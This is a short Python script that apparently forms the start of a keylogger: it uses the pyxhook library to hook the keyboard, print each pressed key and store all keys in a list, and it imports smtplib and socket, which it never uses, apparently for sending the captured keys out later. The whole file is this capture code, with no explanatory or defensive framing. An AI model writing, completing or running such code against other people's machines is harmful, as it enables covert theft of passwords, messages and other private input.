from __future__ import print_function


import pyxhook
import time
import smtplib   
import socket

tuslar=[]

def kbevent(event):
    
    print(event.Key)
    x=str(event.Key)
    print(x)
    tuslar.append(x)
    print(tuslar)
hookman = pyxhook.HookManager()

hookman.KeyDown = kbevent

hookman.HookKeyboard()

hookman.start()


running = True
while running:
    time.sleep(0.1)


hookman.cancel()
